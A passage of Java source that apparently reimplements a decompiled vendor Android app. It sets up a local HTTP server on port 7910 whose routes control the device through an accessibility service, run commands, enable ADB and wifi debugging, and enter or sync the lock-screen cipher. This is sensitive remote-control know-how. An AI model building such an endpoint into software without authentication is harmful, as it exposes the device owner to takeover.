        httpServer.post("/target/findOneByOperateOr", (req, res) -> parseAndRoute("/target/findOneByOperateOr", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByCombine", (req, res) -> parseAndRoute("/target/findOneByCombine", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByCombineWithChild", (req, res) -> parseAndRoute("/target/findOneByCombineWithChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByCombineWithParent", (req, res) -> parseAndRoute("/target/findOneByCombineWithParent", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findOneByCombineWithoutChild", (req, res) -> parseAndRoute("/target/findOneByCombineWithoutChild", req.getBody() != null ? req.getBody().get().toString() : null, res));

        // --- findBy* (集合结果) ---
        httpServer.post("/target/findByText", (req, res) -> parseAndRoute("/target/findByText", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByTextContains", (req, res) -> parseAndRoute("/target/findByTextContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByTextStartsWith", (req, res) -> parseAndRoute("/target/findByTextStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByTextEndsWith", (req, res) -> parseAndRoute("/target/findByTextEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByTextMatches", (req, res) -> parseAndRoute("/target/findByTextMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByDesc", (req, res) -> parseAndRoute("/target/findByDesc", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByDescContains", (req, res) -> parseAndRoute("/target/findByDescContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByDescStartsWith", (req, res) -> parseAndRoute("/target/findByDescStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByDescEndsWith", (req, res) -> parseAndRoute("/target/findByDescEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByDescMatches", (req, res) -> parseAndRoute("/target/findByDescMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findById", (req, res) -> parseAndRoute("/target/findById", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByIdContains", (req, res) -> parseAndRoute("/target/findByIdContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByIdStartsWith", (req, res) -> parseAndRoute("/target/findByIdStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByIdEndsWith", (req, res) -> parseAndRoute("/target/findByIdEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByIdMatches", (req, res) -> parseAndRoute("/target/findByIdMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByClassName", (req, res) -> parseAndRoute("/target/findByClassName", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByClassNameContains", (req, res) -> parseAndRoute("/target/findByClassNameContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByClassNameStartsWith", (req, res) -> parseAndRoute("/target/findByClassNameStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByClassNameEndsWith", (req, res) -> parseAndRoute("/target/findByClassNameEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByClassNameMatches", (req, res) -> parseAndRoute("/target/findByClassNameMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByCombine", (req, res) -> parseAndRoute("/target/findByCombine", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByCombineWithChild", (req, res) -> parseAndRoute("/target/findByCombineWithChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByCombineWithoutChild", (req, res) -> parseAndRoute("/target/findByCombineWithoutChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findByOperateOr", (req, res) -> parseAndRoute("/target/findByOperateOr", req.getBody() != null ? req.getBody().get().toString() : null, res));

        // --- findLastBy* ---
        httpServer.post("/target/findLastByText", (req, res) -> parseAndRoute("/target/findLastByText", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByTextContains", (req, res) -> parseAndRoute("/target/findLastByTextContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByTextStartsWith", (req, res) -> parseAndRoute("/target/findLastByTextStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByTextEndsWith", (req, res) -> parseAndRoute("/target/findLastByTextEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByTextMatches", (req, res) -> parseAndRoute("/target/findLastByTextMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByDesc", (req, res) -> parseAndRoute("/target/findLastByDesc", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByDescContains", (req, res) -> parseAndRoute("/target/findLastByDescContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByDescStartsWith", (req, res) -> parseAndRoute("/target/findLastByDescStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByDescEndsWith", (req, res) -> parseAndRoute("/target/findLastByDescEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByDescMatches", (req, res) -> parseAndRoute("/target/findLastByDescMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastById", (req, res) -> parseAndRoute("/target/findLastById", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByIdContains", (req, res) -> parseAndRoute("/target/findLastByIdContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByIdStartsWith", (req, res) -> parseAndRoute("/target/findLastByIdStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByIdEndsWith", (req, res) -> parseAndRoute("/target/findLastByIdEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByIdMatches", (req, res) -> parseAndRoute("/target/findLastByIdMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByClassName", (req, res) -> parseAndRoute("/target/findLastByClassName", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByClassNameContains", (req, res) -> parseAndRoute("/target/findLastByClassNameContains", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByClassNameStartsWith", (req, res) -> parseAndRoute("/target/findLastByClassNameStartsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByClassNameEndsWith", (req, res) -> parseAndRoute("/target/findLastByClassNameEndsWith", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByClassNameMatches", (req, res) -> parseAndRoute("/target/findLastByClassNameMatches", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findLastByCombine", (req, res) -> parseAndRoute("/target/findLastByCombine", req.getBody() != null ? req.getBody().get().toString() : null, res));

        // --- 父节点/子节点查找 ---
        httpServer.post("/target/findParentByCombine", (req, res) -> parseAndRoute("/target/findParentByCombine", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findParentByCombineWithUpLevel", (req, res) -> parseAndRoute("/target/findParentByCombineWithUpLevel", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findParentUtilCombine", (req, res) -> parseAndRoute("/target/findParentUtilCombine", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/findChildUtilUpLevel", (req, res) -> parseAndRoute("/target/findChildUtilUpLevel", req.getBody() != null ? req.getBody().get().toString() : null, res));

        // --- scroll 系列 (16 条) ---
        httpServer.post("/target/scrollForwardUtilWithCombine", (req, res) -> parseAndRoute("/target/scrollForwardUtilWithCombine", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollForwardUtilMultipleWithCombine", (req, res) -> parseAndRoute("/target/scrollForwardUtilMultipleWithCombine", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollBackwardUtilWithCombine", (req, res) -> parseAndRoute("/target/scrollBackwardUtilWithCombine", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollBackwardUtilMultipleWithCombine", (req, res) -> parseAndRoute("/target/scrollBackwardUtilMultipleWithCombine", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollForwardUtilWithChild", (req, res) -> parseAndRoute("/target/scrollForwardUtilWithChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollForwardUtilMultipleWithChild", (req, res) -> parseAndRoute("/target/scrollForwardUtilMultipleWithChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollBackwardUtilWithChild", (req, res) -> parseAndRoute("/target/scrollBackwardUtilWithChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollBackwardUtilMultipleWithChild", (req, res) -> parseAndRoute("/target/scrollBackwardUtilMultipleWithChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollForwardUtilWithoutChild", (req, res) -> parseAndRoute("/target/scrollForwardUtilWithoutChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollForwardUtilMultipleWithoutChild", (req, res) -> parseAndRoute("/target/scrollForwardUtilMultipleWithoutChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollBackwardUtilWithoutChild", (req, res) -> parseAndRoute("/target/scrollBackwardUtilWithoutChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollBackwardUtilMultipleWithoutChild", (req, res) -> parseAndRoute("/target/scrollBackwardUtilMultipleWithoutChild", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollForwardUtilWithOperateOr", (req, res) -> parseAndRoute("/target/scrollForwardUtilWithOperateOr", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollForwardUtilMultipleWithOperateOr", (req, res) -> parseAndRoute("/target/scrollForwardUtilMultipleWithOperateOr", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollBackwardUtilWithOperateOr", (req, res) -> parseAndRoute("/target/scrollBackwardUtilWithOperateOr", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/scrollBackwardUtilMultipleWithOperateOr", (req, res) -> parseAndRoute("/target/scrollBackwardUtilMultipleWithOperateOr", req.getBody() != null ? req.getBody().get().toString() : null, res));

        // --- target action/refresh/matchListenWindow ---
        httpServer.post("/target/action", (req, res) -> parseAndRoute("/target/action", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/refresh", (req, res) -> parseAndRoute("/target/refresh", req.getBody() != null ? req.getBody().get().toString() : null, res));
        httpServer.post("/target/matchListenWindow", (req, res) -> parseAndRoute("/target/matchListenWindow", req.getBody() != null ? req.getBody().get().toString() : null, res));
    }

    // ═══════ 服务器初始化 — vendor W2() ═══════

    public final void startServer() {
        try {
            httpServer.listen(7910);
            Log.d(TAG, "AsyncHttpServer 已启动, 端口 7910");
            serviceState.set(1);

            // 上报 CONTAINER_EVENT
            MessageRecordVO record = new MessageRecordVO();
            ContainerEventVO event = new ContainerEventVO();
            if (MainApplication.getInstance() != null) {
                event.setPackageName(MainApplication.getInstance().getPackageName());
            }
            event.setContainerCode("ACCESSIBILITY_CONTAINER");
            event.setIsOpened(MyAccessibilityService.P() != null ? 1 : 0);
            event.setServiceState(serviceState.get());
            record.setIntentCode("android.intent.action.CONTAINER_EVENT");
            record.setExtraBody(event);
            if (MainApplication.getInstance() != null
                    && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
            }
        } catch (Exception e) {
            AppUtils.s(TAG, e);
        }
    }

    // ═══════ 停止服务器 — vendor f3() ═══════

    public final void stopServer() {
        try {
            serviceState.set(-1);
            httpServer.stop();

            MessageRecordVO record = new MessageRecordVO();
            ContainerEventVO event = new ContainerEventVO();
            if (MainApplication.getInstance() != null) {
                event.setPackageName(MainApplication.getInstance().getPackageName());
            }
            event.setContainerCode("ACCESSIBILITY_CONTAINER");
            event.setIsOpened(MyAccessibilityService.P() != null ? 1 : 0);
            event.setServiceState(serviceState.get());
            record.setIntentCode("android.intent.action.CONTAINER_EVENT");
            record.setExtraBody(event);
            if (MainApplication.getInstance() != null
                    && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
            }
            Log.d(TAG, "HttpServer stopped");
        } catch (Exception e) {
            AppUtils.s(TAG, e);
        }
    }

    // ═══════ vendor r1() — 路由白名单 (不需要无障碍服务的路由) ═══════

    public static boolean isWhitelistedRoute(String url) {
        return "/version".equals(url)
                || "/containerState".equals(url)
                || "/blockView".equals(url)
                || "/deviceId".equals(url)
                || "/isDeviceOwner".equals(url)
                || "/resetWifiDebug".equals(url)
                || "/closeWifiDebug".equals(url)
                || "/openWifiDebug".equals(url)
                || "/openADBDebug".equals(url)
                || "/closeADBDebug".equals(url)
                || "/openDevelopment".equals(url)
                || "/closeDevelopment".equals(url)
                || "/shareADBConfig".equals(url)
                || "/rewriteDebugPort".equals(url)
                || "/syncADBConfig".equals(url)
                || "/syncAdminActivating".equals(url)
                || "/listenHelper".equals(url)
                || "/finishListenHelper".equals(url)
                || "/resetAccessibilityService".equals(url)
                || "/noticeAlive".equals(url)
                || "/syncLockCipher".equals(url)
                || "/syncPowerControl".equals(url);
    }

    // ═══════ vendor m1(response) — 认证失败响应 ═══════

    public static void sendUnauthorized(AsyncHttpServerResponse response) {
        HttpResponseHelper.error(response, "Unauthorized: encryption active");
    }

    // ═══════ vendor X1(url, json, response) — POST 请求处理 ═══════
    //
    // vendor X1 对每个路由用 SharedPrefsManager.d(body, VO.class) 做类型化反序列化。
    // replica 用统一策略：JSON → 扁平键值对(兼容 GET handler) + _raw_body(供 VO 反序列化)
    //
    // 内部路由表 — POST handler 通过 parseAndRoute 将 JSON body 展平后分发到 Handler

    /** POST 路由内部处理函数接口 */
    @FunctionalInterface
    private interface InternalRouteHandler {
        void handle(Multimap params, AsyncHttpServerResponse response) throws Exception;
    }

    /** POST 路由内部分发表 */
    private static final Map<String, InternalRouteHandler> INTERNAL_ROUTES = new HashMap<>();

    static {
        Gson gson = new Gson();

        // ─── 全局动作 POST 路由 ───
        INTERNAL_ROUTES.put("/global/action", (p, r) -> {
            String raw = p.getString("_raw_body");
            GlobalActionCondition cond = raw != null
                    ? (GlobalActionCondition) SharedPrefsManager.d(raw, GlobalActionCondition.class)
                    : gson.fromJson(p.getString("condition"), GlobalActionCondition.class);
            GlobalActionHandler.action(cond, r);
        });
        INTERNAL_ROUTES.put("/global/execCommand", (p, r) -> {
            String raw = p.getString("_raw_body");
            RequestCommand cmd = raw != null
                    ? (RequestCommand) SharedPrefsManager.d(raw, RequestCommand.class)
                    : new RequestCommand((List) null);
            GlobalActionHandler.execCommand(cmd, r);
        });

        // ─── 应用管理 POST 路由 ───
        INTERNAL_ROUTES.put("/startSettings", (p, r) -> {
            String raw = p.getString("_raw_body");
            List windows = null;
            if (raw != null) { ReqStartApp vo = (ReqStartApp) SharedPrefsManager.d(raw, ReqStartApp.class); if (vo != null) windows = vo.getListenWindows(); }
            AppManageHandler.startSettings(windows, r);
        });
        INTERNAL_ROUTES.put("/startAboutDevice", (p, r) -> {
            String raw = p.getString("_raw_body");
            List windows = null;
            if (raw != null) { ReqStartApp vo = (ReqStartApp) SharedPrefsManager.d(raw, ReqStartApp.class); if (vo != null) windows = vo.getListenWindows(); }
            AppManageHandler.startAboutDevice(windows, r);
        });
        INTERNAL_ROUTES.put("/startDevSetting", (p, r) -> {
            String raw = p.getString("_raw_body");
            List windows = null;
            if (raw != null) { ReqStartApp vo = (ReqStartApp) SharedPrefsManager.d(raw, ReqStartApp.class); if (vo != null) windows = vo.getListenWindows(); }
            AppManageHandler.startDevSetting(windows, r);
        });
        INTERNAL_ROUTES.put("/startWifiSetting", (p, r) -> {
            String raw = p.getString("_raw_body");
            List windows = null;
            if (raw != null) { ReqStartApp vo = (ReqStartApp) SharedPrefsManager.d(raw, ReqStartApp.class); if (vo != null) windows = vo.getListenWindows(); }
            AppManageHandler.startWifiSetting(windows, r);
        });
        INTERNAL_ROUTES.put("/syncAdminActivating", (p, r) -> AppManageHandler.syncAdminActivating(p, r));
        INTERNAL_ROUTES.put("/syncPowerControl", (p, r) -> AppManageHandler.syncPowerControl(p, r));

        // ─── ADB POST 路由 ───
        INTERNAL_ROUTES.put("/localAdbPair", (p, r) -> AdbHandler.localAdbPair(p, r));
        INTERNAL_ROUTES.put("/shareADBConfig", (p, r) -> {
            String raw = p.getString("_raw_body");
            ADBConfig cfg = raw != null ? (ADBConfig) SharedPrefsManager.d(raw, ADBConfig.class) : null;
            AdbHandler.shareADBConfig(cfg, r);
        });
        INTERNAL_ROUTES.put("/syncADBConfig", (p, r) -> {
            String raw = p.getString("_raw_body");
            ADBConfig cfg = raw != null ? (ADBConfig) SharedPrefsManager.d(raw, ADBConfig.class) : null;
            AdbHandler.syncADBConfig(cfg, r);
        });

        // ─── 解锁 POST 路由 ───
        INTERNAL_ROUTES.put("/enterCipher", (p, r) -> {
            String raw = p.getString("_raw_body");
            DeviceCipherStateVO vo = raw != null ? (DeviceCipherStateVO) SharedPrefsManager.d(raw, DeviceCipherStateVO.class) : null;
            UnlockHandler.enterCipher(vo, r);
        });
        INTERNAL_ROUTES.put("/confirmLock", (p, r) -> {
            String raw = p.getString("_raw_body");
            DeviceCipherStateVO vo = raw != null ? (DeviceCipherStateVO) SharedPrefsManager.d(raw, DeviceCipherStateVO.class) : null;
            UnlockHandler.confirmLock(vo, r);
        });
        INTERNAL_ROUTES.put("/syncLockCipher", (p, r) -> {
            String raw = p.getString("_raw_body");
            DeviceCipherStateVO vo = raw != null ? (DeviceCipherStateVO) SharedPrefsManager.d(raw, DeviceCipherStateVO.class) : null;
            UnlockHandler.syncLockCipher(vo, r);
        });

        // ─── 无障碍 POST 路由 ───
        INTERNAL_ROUTES.put("/listenWindow", (p, r) -> AccessibilityHandler.listenWindow(p, r));
        INTERNAL_ROUTES.put("/listenHelper", (p, r) -> AccessibilityHandler.listenHelper(p, r));
        INTERNAL_ROUTES.put("/finishListenHelper", (p, r) -> AccessibilityHandler.finishListenHelper(p, r));

        // ─── UI弹窗 POST 路由 ───
        INTERNAL_ROUTES.put("/requestPermission", (p, r) -> {
            String json = p.getString("_raw_body");
            PermissionRequestVO vo = null;
            if (json != null) {
                vo = (PermissionRequestVO) SharedPrefsManager.d(json, PermissionRequestVO.class);
            }
            UiDialogHandler.requestPermission(vo, r);
        });

        // ─── NodeSearch POST 路由 (93条) — 全部通过 params 分发到 NodeSearchHandler ───
        INTERNAL_ROUTES.put("/target/findOneByText", (p, r) -> NodeSearchHandler.findOneByText(p, r));
        INTERNAL_ROUTES.put("/target/findOneByTextContains", (p, r) -> NodeSearchHandler.findOneByTextContains(p, r));
        INTERNAL_ROUTES.put("/target/findOneByTextStartsWith", (p, r) -> NodeSearchHandler.findOneByTextStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findOneByTextEndsWith", (p, r) -> NodeSearchHandler.findOneByTextEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findOneByTextMatches", (p, r) -> NodeSearchHandler.findOneByTextMatches(p, r));
        INTERNAL_ROUTES.put("/target/findOneByDesc", (p, r) -> NodeSearchHandler.findOneByDesc(p, r));
        INTERNAL_ROUTES.put("/target/findOneByDescContains", (p, r) -> NodeSearchHandler.findOneByDescContains(p, r));
        INTERNAL_ROUTES.put("/target/findOneByDescStartsWith", (p, r) -> NodeSearchHandler.findOneByDescStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findOneByDescEndsWith", (p, r) -> NodeSearchHandler.findOneByDescEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findOneByDescMatches", (p, r) -> NodeSearchHandler.findOneByDescMatches(p, r));
        INTERNAL_ROUTES.put("/target/findOneById", (p, r) -> NodeSearchHandler.findOneById(p, r));
        INTERNAL_ROUTES.put("/target/findOneByIdContains", (p, r) -> NodeSearchHandler.findOneByIdContains(p, r));
        INTERNAL_ROUTES.put("/target/findOneByIdStartsWith", (p, r) -> NodeSearchHandler.findOneByIdStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findOneByIdEndsWith", (p, r) -> NodeSearchHandler.findOneByIdEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findOneByIdMatches", (p, r) -> NodeSearchHandler.findOneByIdMatches(p, r));
        INTERNAL_ROUTES.put("/target/findOneByClassName", (p, r) -> NodeSearchHandler.findOneByClassName(p, r));
        INTERNAL_ROUTES.put("/target/findOneByClassNameContains", (p, r) -> NodeSearchHandler.findOneByClassNameContains(p, r));
        INTERNAL_ROUTES.put("/target/findOneByClassNameStartsWith", (p, r) -> NodeSearchHandler.findOneByClassNameStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findOneByClassNameEndsWith", (p, r) -> NodeSearchHandler.findOneByClassNameEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findOneByClassNameMatches", (p, r) -> NodeSearchHandler.findOneByClassNameMatches(p, r));
        INTERNAL_ROUTES.put("/target/findOneByOperateOr", (p, r) -> NodeSearchHandler.findOneByOperateOr(p, r));
        INTERNAL_ROUTES.put("/target/findOneByCombine", (p, r) -> NodeSearchHandler.findOneByCombine(p, r));
        INTERNAL_ROUTES.put("/target/findOneByCombineWithChild", (p, r) -> NodeSearchHandler.findOneByCombineWithChild(p, r));
        INTERNAL_ROUTES.put("/target/findOneByCombineWithParent", (p, r) -> NodeSearchHandler.findOneByCombineWithParent(p, r));
        INTERNAL_ROUTES.put("/target/findOneByCombineWithoutChild", (p, r) -> NodeSearchHandler.findOneByCombineWithoutChild(p, r));
        INTERNAL_ROUTES.put("/target/findByText", (p, r) -> NodeSearchHandler.findByText(p, r));
        INTERNAL_ROUTES.put("/target/findByTextContains", (p, r) -> NodeSearchHandler.findByTextContains(p, r));
        INTERNAL_ROUTES.put("/target/findByTextStartsWith", (p, r) -> NodeSearchHandler.findByTextStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findByTextEndsWith", (p, r) -> NodeSearchHandler.findByTextEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findByTextMatches", (p, r) -> NodeSearchHandler.findByTextMatches(p, r));
        INTERNAL_ROUTES.put("/target/findByDesc", (p, r) -> NodeSearchHandler.findByDesc(p, r));
        INTERNAL_ROUTES.put("/target/findByDescContains", (p, r) -> NodeSearchHandler.findByDescContains(p, r));
        INTERNAL_ROUTES.put("/target/findByDescStartsWith", (p, r) -> NodeSearchHandler.findByDescStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findByDescEndsWith", (p, r) -> NodeSearchHandler.findByDescEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findByDescMatches", (p, r) -> NodeSearchHandler.findByDescMatches(p, r));
        INTERNAL_ROUTES.put("/target/findById", (p, r) -> NodeSearchHandler.findById(p, r));
        INTERNAL_ROUTES.put("/target/findByIdContains", (p, r) -> NodeSearchHandler.findByIdContains(p, r));
        INTERNAL_ROUTES.put("/target/findByIdStartsWith", (p, r) -> NodeSearchHandler.findByIdStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findByIdEndsWith", (p, r) -> NodeSearchHandler.findByIdEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findByIdMatches", (p, r) -> NodeSearchHandler.findByIdMatches(p, r));
        INTERNAL_ROUTES.put("/target/findByClassName", (p, r) -> NodeSearchHandler.findByClassName(p, r));
        INTERNAL_ROUTES.put("/target/findByClassNameContains", (p, r) -> NodeSearchHandler.findByClassNameContains(p, r));
        INTERNAL_ROUTES.put("/target/findByClassNameStartsWith", (p, r) -> NodeSearchHandler.findByClassNameStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findByClassNameEndsWith", (p, r) -> NodeSearchHandler.findByClassNameEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findByClassNameMatches", (p, r) -> NodeSearchHandler.findByClassNameMatches(p, r));
        INTERNAL_ROUTES.put("/target/findByCombine", (p, r) -> NodeSearchHandler.findByCombine(p, r));
        INTERNAL_ROUTES.put("/target/findByCombineWithChild", (p, r) -> NodeSearchHandler.findByCombineWithChild(p, r));
        INTERNAL_ROUTES.put("/target/findByCombineWithoutChild", (p, r) -> NodeSearchHandler.findByCombineWithoutChild(p, r));
        INTERNAL_ROUTES.put("/target/findByOperateOr", (p, r) -> NodeSearchHandler.findByOperateOr(p, r));
        INTERNAL_ROUTES.put("/target/findLastByText", (p, r) -> NodeSearchHandler.findLastByText(p, r));
        INTERNAL_ROUTES.put("/target/findLastByTextContains", (p, r) -> NodeSearchHandler.findLastByTextContains(p, r));
        INTERNAL_ROUTES.put("/target/findLastByTextStartsWith", (p, r) -> NodeSearchHandler.findLastByTextStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findLastByTextEndsWith", (p, r) -> NodeSearchHandler.findLastByTextEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findLastByTextMatches", (p, r) -> NodeSearchHandler.findLastByTextMatches(p, r));
        INTERNAL_ROUTES.put("/target/findLastByDesc", (p, r) -> NodeSearchHandler.findLastByDesc(p, r));
        INTERNAL_ROUTES.put("/target/findLastByDescContains", (p, r) -> NodeSearchHandler.findLastByDescContains(p, r));
        INTERNAL_ROUTES.put("/target/findLastByDescStartsWith", (p, r) -> NodeSearchHandler.findLastByDescStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findLastByDescEndsWith", (p, r) -> NodeSearchHandler.findLastByDescEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findLastByDescMatches", (p, r) -> NodeSearchHandler.findLastByDescMatches(p, r));
        INTERNAL_ROUTES.put("/target/findLastById", (p, r) -> NodeSearchHandler.findLastById(p, r));
        INTERNAL_ROUTES.put("/target/findLastByIdContains", (p, r) -> NodeSearchHandler.findLastByIdContains(p, r));
        INTERNAL_ROUTES.put("/target/findLastByIdStartsWith", (p, r) -> NodeSearchHandler.findLastByIdStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findLastByIdEndsWith", (p, r) -> NodeSearchHandler.findLastByIdEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findLastByIdMatches", (p, r) -> NodeSearchHandler.findLastByIdMatches(p, r));
        INTERNAL_ROUTES.put("/target/findLastByClassName", (p, r) -> NodeSearchHandler.findLastByClassName(p, r));
        INTERNAL_ROUTES.put("/target/findLastByClassNameContains", (p, r) -> NodeSearchHandler.findLastByClassNameContains(p, r));
        INTERNAL_ROUTES.put("/target/findLastByClassNameStartsWith", (p, r) -> NodeSearchHandler.findLastByClassNameStartsWith(p, r));
        INTERNAL_ROUTES.put("/target/findLastByClassNameEndsWith", (p, r) -> NodeSearchHandler.findLastByClassNameEndsWith(p, r));
        INTERNAL_ROUTES.put("/target/findLastByClassNameMatches", (p, r) -> NodeSearchHandler.findLastByClassNameMatches(p, r));
        INTERNAL_ROUTES.put("/target/findLastByCombine", (p, r) -> NodeSearchHandler.findLastByCombine(p, r));
        INTERNAL_ROUTES.put("/target/findParentByCombine", (p, r) -> NodeSearchHandler.findParentByCombine(p, r));
        INTERNAL_ROUTES.put("/target/findParentByCombineWithUpLevel", (p, r) -> NodeSearchHandler.findParentByCombineWithUpLevel(p, r));
        INTERNAL_ROUTES.put("/target/findParentUtilCombine", (p, r) -> NodeSearchHandler.findParentUtilCombine(p, r));
        INTERNAL_ROUTES.put("/target/findChildUtilUpLevel", (p, r) -> NodeSearchHandler.findChildUtilUpLevel(p, r));
        INTERNAL_ROUTES.put("/target/scrollForwardUtilWithCombine", (p, r) -> NodeSearchHandler.scrollForwardUtilWithCombine(p, r));
        INTERNAL_ROUTES.put("/target/scrollForwardUtilMultipleWithCombine", (p, r) -> NodeSearchHandler.scrollForwardUtilMultipleWithCombine(p, r));
        INTERNAL_ROUTES.put("/target/scrollBackwardUtilWithCombine", (p, r) -> NodeSearchHandler.scrollBackwardUtilWithCombine(p, r));
        INTERNAL_ROUTES.put("/target/scrollBackwardUtilMultipleWithCombine", (p, r) -> NodeSearchHandler.scrollBackwardUtilMultipleWithCombine(p, r));
        INTERNAL_ROUTES.put("/target/scrollForwardUtilWithChild", (p, r) -> NodeSearchHandler.scrollForwardUtilWithChild(p, r));
        INTERNAL_ROUTES.put("/target/scrollForwardUtilMultipleWithChild", (p, r) -> NodeSearchHandler.scrollForwardUtilMultipleWithChild(p, r));
        INTERNAL_ROUTES.put("/target/scrollBackwardUtilWithChild", (p, r) -> NodeSearchHandler.scrollBackwardUtilWithChild(p, r));
        INTERNAL_ROUTES.put("/target/scrollBackwardUtilMultipleWithChild", (p, r) -> NodeSearchHandler.scrollBackwardUtilMultipleWithChild(p, r));
        INTERNAL_ROUTES.put("/target/scrollForwardUtilWithoutChild", (p, r) -> NodeSearchHandler.scrollForwardUtilWithoutChild(p, r));
